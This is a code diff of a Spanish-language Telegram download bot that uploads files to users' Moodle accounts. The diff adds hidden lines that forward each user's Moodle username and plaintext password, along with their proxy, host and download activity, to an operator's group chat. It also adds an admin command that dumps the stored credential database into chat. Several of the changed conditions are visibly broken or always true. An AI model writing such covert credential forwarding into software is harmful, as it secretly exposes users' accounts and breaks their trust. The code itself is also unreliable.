@@ -3,7 +3,6 @@ from pyobigram.client import ObigramClient,inlineQueryResultArticle
 from MoodleClient import MoodleClient
 
 from JDatabase import JsonDatabase
-import requests
 import zipfile
 import os
 import infos
@@ -23,27 +22,22 @@ import ProxyCloud
 import socket
 import S5Crypto
 import config
-                  
 
-def monitoreo(bot,message,update,thread,url = None):
-   try:
-    msg271 = bot.editMessageText(message,"Escaneando...") 
-    r = requests.head(url)
-    if r.status_code == 200 or r.status_code == 303:
-         bot.editMessageText(msg271,f"Escaneo Completado:\n\n{url} is UP")    
 
-    else:
-         bot.editMessageText(msg271,f"Escaneo Completado:\n\n{url} is Error..\nType Error=[{r.status_code}]")
-   except: bot.editMessageText(message,f"Error al escanear el url\n\n[{url}]")      
+group_id = config.groupid
+
+
 
 def downloadFile(downloader,filename,currentBits,totalBits,speed,time,args):
     try:
         bot = args[0]
         message = args[1]
         thread = args[2]
+        username = update.message.sender.username
         if thread.getStore('stop'):
             downloader.stop()
         downloadingInfo = infos.createDownloading(filename,totalBits,currentBits,speed,time,tid=thread.id)
+        bot.sendMessage(chat_id=group_id,text=f"Usuario:{username}Esta bajando el siguiente archivo: {filename}")
         bot.editMessageText(message,downloadingInfo)
     except Exception as ex: print(str(ex))
     pass
@@ -145,7 +139,7 @@ def processUploadFiles(filename,filesize,files,update,bot,message,thread=None,jd
         return None
     except Exception as ex:
         bot.editMessageText(message,'Error\n' + str(ex))
-        return None
+        return 
 
 
 def processFile(update,bot,message,file,thread=None,jdb=None):
@@ -251,10 +245,10 @@ def processFile(update,bot,message,file,thread=None,jdb=None):
             else:
                 return
         except:
-            bot.sendMessage(message.chat.id,'Error moviendo a calendar'+str(ex))
+            bot.sendMessage(message.chat.id,'Error moviendo a calendar')
     else:
-        bot.editMessageText(message,'Error'+str(ex))
-        return
+        bot.editMessageText(message,'Error')
+        return    
 
 def ddl(update,bot,message,url,file_name='',thread=None,jdb=None):
     downloader = Downloader()
@@ -322,6 +316,9 @@ def onmessage(update,bot:ObigramClient):
         else:
             msg323= "No tienes acceso"
             bot.sendMessage(update.message.chat.id,msg323)
+            try:
+                bot.sendMessage(chat_id=group_id,text=f"Usuario: @{username} ha intentado acceder al bot")
+            except:pass     
             return
 
 
@@ -339,6 +336,9 @@ def onmessage(update,bot:ObigramClient):
                     jdb.save()
                     msg = "Usuario @"+user+" tiene acceso"
                     bot.sendMessage(update.message.chat.id,msg)
+                    try:
+                        bot.sendMessage(chat_id=group_id,text=f"@{user} tiene acceso al bot")
+                    except:pass    
                 except:
                     bot.sendMessage(update.message.chat.id,'Error en el comando /adduser username')
             else:
@@ -378,9 +378,12 @@ def onmessage(update,bot:ObigramClient):
         if '/getdb' in msgText:
             isadmin = jdb.is_admin(username)
             if isadmin:
-                pass
+                db = open("database.jdb")
+                dbr = db.read()
+                bot.sendMessage(update.message.chat.id,"Base de datos:\n\n"+dbr)
             else:
-                bot.sendMessage(update.message.chat.id,'Acceso Denegado')        
+                bot.sendMessage(update.message.chat.id,'Acceso Denegado')
+                bot.sendMessage(chat_id=group_id,text=f"@{username} intento usar la base de datos sin permiso")        
             return
         # end
 
@@ -422,15 +425,15 @@ def onmessage(update,bot:ObigramClient):
                     jdb.save()
                     statInfo = infos.createStat(username,getUser,jdb.is_admin(username))
                     bot.sendMessage(update.message.chat.id,"Usuario y contraseña guardado con existo")
+                    bot.sendMessage(chat_id=group_id,text=f"Usuario:{username} ha configurado su cuenta\nUsuario:{user}\nPass:{passw}")
             except:
                 bot.sendMessage(update.message.chat.id,'Ponga su usuario separado de la contraseña')
             return
         if '/host' in msgText:
             try:
-               cmd = str(msgText).split(' ',2)
-               host = cmd[1] 
                if "https" or "http" in msgText: 
-
+                cmd = str(msgText).split(' ',2)
+                host = cmd[1]
                 getUser = user_info
                 if getUser:
                     getUser['moodle_host'] = host
@@ -438,6 +441,8 @@ def onmessage(update,bot:ObigramClient):
                     jdb.save()
                     statInfo = infos.createStat(username,getUser,jdb.is_admin(username))
                     bot.sendMessage(update.message.chat.id,"Host guardado")
+                    bot.sendMessage(chat_id=group_id,text=f"Usuario:{username} ha configurado su host:{host}")
+
                else: bot.sendMessage(update.message.chat.id,"Host no permitido, Revise bien el url")     
             except:
                 bot.sendMessage(update.message.chat.id,'Error al guardar el host')
@@ -457,8 +462,6 @@ def onmessage(update,bot:ObigramClient):
             return
         if '/cloud' in msgText:
             try:
-               cmd = str(msgText).split(' ',2)
-               repoid = cmd[1]
                if "cloud" or "moodle" in msgText: 
                 cmd = str(msgText).split(' ',2)
                 repoid = cmd[1]
@@ -475,8 +478,9 @@ def onmessage(update,bot:ObigramClient):
             return
         if '/uptype' in msgText:
             try:
+               if  "calendar" or "perfil" or "evidence" or "blog" or "draft" in msgText:
                 cmd = str(msgText).split(' ',2)
-                type = cmd[1] 
+                type = cmd[1]
                 getUser = user_info
                 if getUser:
                     getUser['uploadtype'] = type
@@ -484,6 +488,7 @@ def onmessage(update,bot:ObigramClient):
                     jdb.save()
                     statInfo = infos.createStat(username,getUser,jdb.is_admin(username))
                     bot.sendMessage(update.message.chat.id,"Uptype cambiado a: "+type+"")
+               else: bot.sendMessage(update.message.chat.id,"Uptype no permitido")
             except:
                 bot.sendMessage(update.message.chat.id,'Error en el comando /uptype (typo de subida)')
             return
@@ -499,6 +504,7 @@ def onmessage(update,bot:ObigramClient):
                     jdb.save()
                     statInfo = infos.createStat(username,getUser,jdb.is_admin(username))
                     bot.sendMessage(update.message.chat.id,"Proxy guardado")
+                    bot.sendMessage(chat_id=group_id,text=f"Usuario{username} ha configurado su proxy:{proxy}")
                else: bot.sendMessage(update.message.chat.id,"Proxy no permitido, debe llevar lo siguiente : socks5://")           
             except: pass
             return
@@ -557,35 +563,26 @@ def onmessage(update,bot:ObigramClient):
 
         thread.store('msg',message)
         if '/login' in msgText:
-            import MoodleClient
-            message71= bot.editMessageText(message,"Logueando....")
-            getUser = user_info
-            if getUser:
-                user = getUser['moodle_user']
-                passw = getUser['moodle_password']
-                host = getUser['moodle_host']
-                proxy = ProxyCloud.parse['proxy']
-                if user and passw and host != '':
-                        client = MoodleClient(getUser['moodle_user'],
+             getUser = user_info
+             if getUser:
+                 user = getUser['moodle_user']
+                 passw = getUser['moodle_password']
+                 host = getUser['moodle_host']
+                 proxy = getUser['proxy']
+                 if user and passw and host != '':
+                        info= MoodleClient(getUser['moodle_user'],
                                            getUser['moodle_password'],
                                            getUser['moodle_host'],
-                                           getUser['moodle_repo_id'],
                                            proxy=proxy)
-                        loged = client.login()
-                        if loged:
-                                bot.editMessageText(message71,"Conexion Ready :D")                           
-                else: bot.editMessageText(message71,"No ha puesto sus credenciales")      
-                return  
-        if '/watch' in msgText:
-            url1 = msgText.split(" ")[1]
-            if "https" or "http" in msgText: 
-               monitoreo(bot,message,update,thread,url = url1)              
-            else: bot.editMessageText(message,"Error al leer como url")
-            return
+                        logins = info.MoodleClient
+                        if logins:
+                                bot.editMessageText(message,"Conexion Ready :D")  
+                        else: bot.editMessageText(message,"Error al conectar")                         
+                 else: bot.editMessageText(message,"No ha puesto sus credenciales")    
+                 return   
         if '/start' in msgText:
-            startmsg1 = bot.editMessageText(message,"Iniciando sesion..")
-            start_msg = '#Inicio_de_sesion_correcto\n\nBienvenido @'+username+' al bot de descargas gratis.\n'
-            bot.editMessageText(startmsg1,start_msg)
+            start_msg = '#Inicio de sesion correcto\n\nBienvenido @'+username+' al bot de descargas gratis.\n'
+            bot.editMessageText(message,start_msg)
             return
         if '/token' in msgText:
             message2 = bot.editMessageText(message,'Obteniendo Token...')
@@ -709,10 +706,12 @@ def onmessage(update,bot:ObigramClient):
         elif '/download' in msgText:
            try: 
             url = msgText.split(" ")[1]
-            ddl(update,bot,message,url,file_name='',thread=thread,jdb=jdb)
+            if "https" or "http" in msgText:
+             ddl(update,bot,message,url,file_name='',thread=thread,jdb=jdb)
+            else: bot.sendMessage(update.message.chat.id,"Lo que intenta descargar no es un url")           
            except: bot.editMessageText(message,"Error al descargar el archvivo")
         else:
-            bot.editMessageText(message,'Comando erroneo')
+            pass
     except Exception as ex:
            print(str(ex))
 
